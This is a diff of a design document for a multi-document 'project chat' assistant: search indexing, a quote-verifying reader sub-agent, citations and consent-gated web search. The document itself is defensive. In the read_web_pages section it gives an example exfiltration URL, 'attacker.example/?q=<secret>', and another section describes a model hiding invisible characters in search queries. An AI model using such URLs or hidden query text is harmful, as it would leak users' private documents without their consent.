@@ -1,6 +1,6 @@
 # Project chat (C2.1): ask a whole project — design
 
-**Date:** 2026-10-18 · **Status:** draft for review
+**Date:** 2026-10-18 · **Status:** built on the C2.1 branch. Where the build ruled differently, the section carries an "**Amended:**" note with the reason; the rest stands as designed
 **Program:** C2 (A0 roles → V1 versions → **C2.1 project chat** → V2 compare/review → C2.2 digests), and the first piece of Phase C.
 **Builds on:** chat orchestrator (`2026-09-27-chat-orchestrator-design.md`), v2.4 document context, document versions (`2026-10-12-document-versions-design.md`).
 **Research behind it:** `docs/research/2026-10-17-librechat-llmrouter-comparison.md`, plus the Meilisearch and multi-document retrieval reading of 2026-10-17/18 (summarised in §12).
@@ -101,6 +101,7 @@ The assistant gets a map of the project before it does anything. This is the "tw
   - its outline: headings of levels 1–3, each with its page, written compactly (`Quick start p2 · Configuration p4 · …`);
   - with no outline, its opening line instead: the first 120 characters of page 1.
 - **Budget.** `CHAT_PROJECT_MAP_CHARS`, default 6000 (about 1,500 tokens). When the map is over budget it is shortened in this order: drop level-3 headings, then level-2, then cut each outline to its first 8 entries, then names and pages only. Whenever anything was cut, the `document_outline` tool (§5.4) is offered for this turn and the map says so in one line. **Our call:** 6000 leaves room for an answer in an 8,192-token window.
+  - **Amended:** the order is: drop level-3 headings; then keep level 2 but cut each outline to its first 8 entries; then drop level 2 as well (level 1 only, still the first 8 entries); then names and pages only. Each step includes the ones before it, and the first that fits is used. *Reason:* a Markdown outline has one level-1 heading (the title) and its sections at level 2, so dropping level 2 before the cap left titles only and gave the cap nothing to cut. On a turn that offers no tools (a model without tool support, or no tool rounds) the one line says only "Outlines are shortened." and never names `document_outline`, because the rules name a tool only when it is offered. A document is never dropped from the map, however many there are.
 - **Stability.** The map changes only when the project's documents or their states change, so it doesn't break the prefix cache from turn to turn.
 
 Example (shape only):
@@ -117,6 +118,8 @@ Example (shape only):
 ### 5.3 Indexing: code blocks and outlines (fixes F4)
 
 - **Code becomes searchable.** Fenced and indented code blocks become chunks with `chunk_type = 'code'`, on the page the block already occupies. Their text is the code verbatim: newlines kept, capped like other chunks. The reader's page layout and narration don't change, because code blocks already take up their page and the reader still skips them when reading aloud. Only the server's chunk list grows. Search and `read_document_pages` include code chunks, and `read_document_pages` shows them fenced, so the model knows they are commands.
+- **Amended (ruling R2):** code chunks are interleaved with the other chunks in document order, not appended, so a procedure reads as written. The reader-equality test (`server/tests/fixtures/segmentation`) compares only the non-code chunks, because the reader has no chunk for code; that way the reader's page layout can't move. Only **top-level** code blocks become code chunks: a block inside a list or a quote stays part of that block's text. `read_document_pages` shows code fenced, one fence per block even when the block is stored in parts. *Reason:* in document order a command sits next to the sentence that introduces it, in search results and when a page is read, and the reader's layout stays checkable.
+- **Amended:** the cells of a Markdown table are separated by spaces in the chunk text, so their words are searchable (before, `OIDC_ISSUER` and its value ran together as `OIDC_ISSUERhttp://x`, one word nobody would search for). Pages are still counted from the reader's own text, with the cells glued, so no page moves. `CHUNKER_VERSION` is `split1:{max}:{overlap}:code1:cells1`; the `code1` and `cells1` parts make each existing document rebuild on first use, and the rebuild embeds only text with no stored vector.
 - **Outlines.** Extraction also records an outline: a list of `(level 1–3, text, page)`.
   - Markdown, and PDFs converted with Docling (their per-page Markdown in `doc_pages`): the headings.
   - Other PDFs: the PDF's own bookmarks (its table of contents, via `pypdfium2`).
@@ -134,6 +137,8 @@ Example (shape only):
 | `document_outline(document)` | only when the map was shortened | New. Returns the stored outline, all levels, with pages |
 | `offer_web_search(query, reason)` | web configured, mode `ask`, turn not approved | New (§5.8) |
 | `web_search(query)` and `read_web_pages(results, need)` | approved turn, or mode `auto` | Changed and new; `read_web_pages` is the reader on web pages (§5.4.1, §5.8) |
+
+**Amended:** the last two rows changed in §5.8: `web_search` is offered only in mode `auto`; `read_web_pages` in `auto` and on an approved `ask` turn; `offer_web_search` in mode `ask`, also after a yes (a different search needs its own offer).
 
 Tool results already name documents by ref and name (`scope.documents_listing`). An unknown ref or name returns an error listing the valid ones, so the model can correct itself.
 
@@ -159,6 +164,7 @@ The reader is a sub-agent: a separate model call, with a fresh context and no to
 - **The app verifies every quote** against the passage the label names, with case and whitespace normalised.
   - If the quote isn't there but is in another passage of the same batch, the label is corrected.
   - Otherwise the fact is dropped and counted in the log.
+  - **Amended:** normalising also folds quote and dash kinds (curly quotes, en and em dashes, soft hyphens). A word hyphenated at a line end matches whether the hyphen is kept or dropped. A line break between Han or Kana characters is ignored (those scripts are written without spaces). The fenced form of the passage, which is what the model saw, counts too. A quote needs at least 4 characters (2 if it contains a Han or Kana character) unless it is the whole passage; a fact over 600 characters is dropped. *Reason:* quotes that were faithful to a PDF were being dropped for its line-end hyphens and typography, while a one-letter quote "proves" itself in every passage.
 
   Verification is what makes the reader accurate rather than just shorter. It is also how a document fact gets its exact page for the citation and the source chips: the evidence is `(document, page, quote)`.
 - **Which model reads.**
@@ -173,6 +179,7 @@ The reader is a sub-agent: a separate model call, with a fresh context and no to
 1. **Arguments.** `documents` takes 1–5 map refs or exact names. `pages` optionally gives page ranges per document.
 2. **Which pages.** The given pages; otherwise every page of those documents, up to `CHAT_EXTRACT_MAX_PAGES` (default 12) per call. **Our call:** 12 pages is about three or four batches, so with two at a time and a 60-second limit per batch, one call finishes within about two minutes even on a CPU. Prompt processing is the cost there; measure on the CPU dev machine before raising it. When the documents have more pages than that, the pages are chosen with the vector search (`search_documents`' ranking for the need, best pages first), then read in page order. The result names the pages it did not read, so the chat model can ask for them in another call.
 3. **Batching.** Pages are packed in order into batches, with code chunks fenced as in `read_document_pages`. Each batch gets one reader call.
+   - **Amended:** a page with no text (a cover, a scan) is skipped: it never takes a place in the page cap and is never listed as not read. A page longer than `READER_INPUT_CHARS` is split into pieces that overlap by 200 characters (a quote across a cut is whole in the next piece), because a batch longer than the limit would otherwise be cut and the reader could only quote the part kept. If ranking the pages for the goal fails, the first pages in order are taken and the result says so.
 4. **What comes back.** Facts grouped per document in page order, each with `(ref, page)` and its quote, at most `CHAT_EXTRACT_OUTPUT_CHARS` (default 4,000) in total.
 5. **Failure.** A batch that fails or times out is reported as "pages N–M not read", with no raw text, because the chat model can read those pages itself with `read_document_pages`.
 
@@ -200,6 +207,7 @@ The numbered procedure in `prompt.py` keeps its shape. What changes:
   - Each fact from a document cites it: `(Name, page N)` in project scope, `(page N)` in document scope.
   - When the documents don't cover part of the question, say so plainly. General knowledge may fill that part, introduced as not from the project's documents, and never with a page.
   - When the answer needs current or outside facts the model doesn't have, it calls `offer_web_search` with a short query (never document text).
+  - **Amended:** on the turn after the user approved a search, the live-information line says the results are above and tells the model to read them (`read_web_pages`) or, for a different search, to call `offer_web_search`. In a chat with no answer step (no document tools and no passages to cite), the sentence that names the site of a web fact, `(example.com)`, goes on the live-information line instead. In a project, a search that finds nothing says "No passages about this in the project's documents." (`NONE_FOUND` is worded for the project, not "the document").
 
 **Our call:** the gap-and-offer change applies to single-document chats too, so the rules stay one strategy. The golden prompt test is updated, so every wording change gets reviewed.
 
@@ -207,6 +215,7 @@ The numbered procedure in `prompt.py` keeps its shape. What changes:
 
 - **Format.** In project scope the model cites `(Name, page N)`, with the name exactly as the map gives it. The reply saves a scope note (`docContext.notes` entry `kind: "scope"`, `[{ref, docId, name}]`). The client links a citation only when its name matches an entry in that note, case-insensitively. The match comes from the saved note, never from the reply text alone (the same rule `citations.js` follows today). A name not in the note stays plain text.
 - **Bare page numbers.** A bare `(page N)` links only when the reply's evidence comes from exactly one document.
+- **Amended:** a citation is counted per part. A part is a name, a comma and a page form (`page 3`, `pages 3-5`, `p. 3`, `pp. 4 and 6`) that sits right after `(` or `;` and right before `;` or `)`, so a joined citation `(A.md, page 3; B.md, pages 1-2)` is two parts and a page list counts every page in it. A range counts every page when it spans up to 10 pages (`RANGE_PAGES`), else only its two ends. The server (`chat/sources.py`) and the client (`src/lib/citations.js`) apply the same rule to each part, and a bare `(page N)` counts for the source chips only when the evidence came from one document. *Reason:* the chips say which pages an answer used, so they must count exactly the citations the reader can click. Web sources are listed only for `http` and `https` addresses, whatever the letter case, and their titles are made inert; a search engine can return `javascript:` and `data:` links.
 - **Prefetch note.** The prefetch note (`kind: "prefetch"`) has one `docId` today. In project scope it carries one entry per document that contributed passages; `citationDoc` in `src/lib/citations.js` must not treat a project reply as a single-document one.
 - **Source chips.** `answer_sources` works on `(document, page)` instead of page. The `data-sources` event and the saved note carry a list per document: `[{docId, docName, pages, used}]`. The chips are grouped by document ("DEPLOYMENT.md · p.3, 6"). The document-scope shape still renders, so saved chats keep their chips.
 - **Web citations.** A fact from the web cites its site, e.g. `(example.com)`. The sources note lists the pages read, with links.
@@ -225,7 +234,9 @@ The numbered procedure in `prompt.py` keeps its shape. What changes:
   3. `ask`.
 - **When a change applies.** The row is read once per turn (one primary-key read, no cache), so a change applies from the next message on every worker.
 - **Without SearXNG.** When `SEARXNG_URL` is unset, the control is shown disabled with the line "Web search isn't set up on this server (SEARXNG_URL)."
+  - **Amended:** `SEARXNG_URL` has a default (`http://localhost:18043`), so the variable is never simply unset. The control is disabled when a deployer sets it to an empty value, which is how web search is turned off for a whole server. `GET /v1/admin/chat-options` returns `searxng: false` in that case.
 - **API.** `GET`/`PUT /v1/admin/chat-options`, gated by the `admin` capability like the other admin routes. A change writes an audit line: who, the old mode, the new mode.
+  - **Amended:** `PUT` takes `{"web_search": "ask"|"auto"|"off"|null}`; `null` deletes the admin's row, so the `CHAT_WEB_SEARCH` value (or `ask`) applies again. The section shows where the current value comes from ("Set here.", "From the server setting CHAT_WEB_SEARCH.", "The default.") and, when it was set here, a **Use the server setting** control that sends `null`. *Reason:* without it, saving a mode once would leave no way back to the deployer's value from the screen.
 - **Scope of the section.** Chat options holds only this setting for now. Later chat-wide options (C2.2, roles) belong in the same section and row.
 
 **User (2026-10-18):** ask before searching, and in `ask` mode *every* web search needs the yes, live-information questions included. The rule is enforced in code (the web tools simply aren't offered) rather than hoped for from the prompt. That matters because a small model once sent "the project's codename" to the web every time (see the `web_search.py` note).
@@ -235,11 +246,15 @@ The numbered procedure in `prompt.py` keeps its shape. What changes:
 - the query in an editable field (≤ 300 characters), so the user sees and controls what leaves the server;
 - **Search the web** and **Not now**.
 
+**Amended:** the card removes characters that render as nothing or reorder text from the reason and the query: zero-width and direction-changing characters (marks, embeddings, overrides, isolates), the word joiner and invisible operators, the byte order mark, the Unicode Tag block and the rest of the invisible format characters, and control characters; tabs and line breaks become one space. The server does the same to the approved query (`clean_query` in `chat/web_consent.py`), so the query sent is the query shown even if a request skipped the card. A query with nothing visible left is no approval: the turn runs no search and the log records only that an approval was ignored, never the query. *Reason:* a model can write a query whose visible part is harmless and whose invisible part is not, and the user's yes must cover exactly what leaves the server.
+
 **Approval.** **Search the web** sends a new turn: the visible message "Search the web for: <query>", plus `context.web = {query}`. The server then:
 1. runs `web_search(query)` itself as the turn's first tool call, shown like the prefetch;
 2. offers `web_search` and `read_web_pages`, plus the document tools, for this turn only.
 
 The approved query skips the copied-from-the-document guard, because the user wrote it. Queries the model writes keep the guard.
+
+**Amended:** consent is narrower than step 2 above says. `web_search` is offered **only in mode `auto`**. On an approved `ask` turn the app runs the user's query itself (as a `web_search` tool exchange with call id `app-web-1`) and offers `read_web_pages` and `offer_web_search`, plus the document tools, and never `web_search`. *Reason:* the user's rule is "every web search asks first". A yes is for the one query they saw; letting the model run a second, model-written query on the same turn would send a search out that nobody approved. A different search is a new offer and needs a new yes. The rule stays enforced by what is offered, not by the prompt. `offer_web_search` is exempt from the turn's tool-result budget and the repeated-call check (`unmetered`): its result is about 150 characters and must always reach the turn, or the offer would be lost.
 
 **`web_search` returns search results only.** Each result is `{n, title, url, site, snippet}`, straight from SearXNG: about 1,500 characters for five results. There is no page fetch and no model call.
 
@@ -248,8 +263,10 @@ The approved query skips the copied-from-the-document guard, because the user wr
 *Why a reader:* raw pages would clog the chat model's context. Three full pages can exceed the window the chat runs with (whatever the user's Settings ask for, capped by `INFERENCE_NUM_CTX_MAX`, default 32,768 tokens). A prompt longer than the window gets cut, so the answer derails or stops midway. Even when the pages fit, on a CPU every extra token in the prompt costs processing time on every step of the turn. Today's summarizer protects the window but loses the detail: it gets only the search query, never the task; it sees the page's first 6,000 characters; and it writes 2–4 generic sentences. The reader keeps the protection and fixes the loss.
 
 1. **Arguments.** `results` is 1–3 result numbers from this chat's web searches, and nothing else. That is the exfiltration guard: a URL found in document text could carry document text out (`https://attacker.example/?q=<secret>`). `need` is the chat model's instruction: what to find and what to bring back, e.g. "the exact dnf package names on RHEL 9 for Python 3.13, ffmpeg and espeak-ng".
+   - **Amended (ruling R1):** `read_web_pages` takes only results from the same turn's searches, not the whole chat's. The results are held per turn (`ToolContext.web_results`), and the history sent to the model carries only the text of earlier replies, so a number from an earlier turn would name a result the model was never shown. A number outside this turn's results is refused with the list of valid ones.
 2. **The app prepares each page.** It fetches it with the existing guards (public addresses only, 2 MB cap, text types), extracts the whole text with trafilatura (the 6,000-character cut goes), and splits it into passages of about 1,000 characters. It keeps the passages that best match the need and the query, in page order, up to the reader's batch size (`READER_INPUT_CHARS`, §5.4.1).
 3. **The reader reads each page** (§5.4.1), one batch per page, with the passages labelled `[web n]`.
+   - **Amended:** each page is cut at line breaks, as the extractor writes them (a row of a list or a table stays whole, so a quote of it stays in one passage), then packed into passages of about 1,000 characters; a line longer than that is cut at sentence ends. The passages that share the most words with the need and the search are kept, in page order, up to `READER_INPUT_CHARS`; a page that shares no word with them is read from the top. Each page is its own batch, so one slow or failing page costs only itself.
 4. **What the chat model gets.** Per page: the title, the URL, `found`, and the facts with their quotes. Three pages come to about 4,000 characters at most.
 5. **Failure.** When a reader fails or times out, that page returns its best-matching passages, capped at 1,500 characters and marked "unread excerpt", so the chat model still gets something bounded. A web page, unlike a document, can't be reread with another tool.
 
@@ -266,6 +283,9 @@ The approved query skips the copied-from-the-document guard, because the user wr
 The same chip appears in the side panel (compact) and on the phone. **Our call:** one control instead of a switch plus a chip.
 
 **Project page.** The project header gains an **Ask about this project** button. It opens the Chat view with a new chat scoped to the project. It is shown to every member, since reading is all it needs.
+- **Amended:** the button is shown when the user has the `chat` capability (the Chat view needs it); without that capability the project page has no such button. It is not hidden by project role, so a site admin who is not a member also sees it, and their first message is refused (§5.1: a non-member admin can't chat with a project).
+- **Amended:** a chat whose project the reader can no longer see shows **Project unavailable** on the chip and in the chat list (the server sends the project's id but no name). Only the server's own 404 "This project doesn't exist or you don't have access." clears the chat's project, with the toast of that text and the refused message put back in the box; any other 404 (the chat, a proxy) keeps the scope and shows its usual notice. After the clear, the chip falls to *This document* if a document is open and in use, else *No document*.
+- **Amended:** the Chat options section shows a source line under the choices ("Set here.", "From the server setting CHAT_WEB_SEARCH." or "The default.") and, when the value was set there, **Use the server setting** (§5.8). Saving a change shows a notice that it applies from the next message and refreshes the assistant-rules preview in the Assistant section, which shows a document chat's rules in the current mode.
 
 **Chat list.** Project chats carry the project's name as a label.
 
@@ -318,6 +338,8 @@ Migration 021 (the `chat_options` row needs no schema change: `app_settings` exi
 
 The session list and session read endpoints return `scope_project: {id, name} | null`, with the name only when the caller can still see the project.
 
+**Amended:** the field is named `scopeProject`, like the other fields of the session record (`messageCount`, `updatedAt`). When the caller can no longer see the project, `scopeProject` is still present, with `name: null`, so the chat knows it had a project.
+
 ## 6. Data flow of one project turn
 
 1. Validate the request → `require_project_role` → `list_project_documents` → `ensure_current` on each indexed document.
@@ -365,6 +387,7 @@ The session list and session read endpoints return `scope_project: {id, name} | 
 
 - **Harness.** A new `server/evals/project_qa.py` beside `doc_qa.py`, running the real turn path (`run_turn`).
 - **Fixture.** A frozen snapshot of `docs/` and `README.md` at a fixed commit, copied under `server/evals/fixtures/project_docs/`, so editing the docs never moves the eval. Plus 30 generated padding documents for the 50-document cases.
+  - **Amended:** variant 50 is the 9 fixture documents plus 41 generated padding documents (9 + 41 = 50), not 30. *Reason:* "50" is the project size the cases are named for, and the 9 fixture documents count toward it.
 - **Cases**, about 14:
 
 | Kind | Example | Scored on |
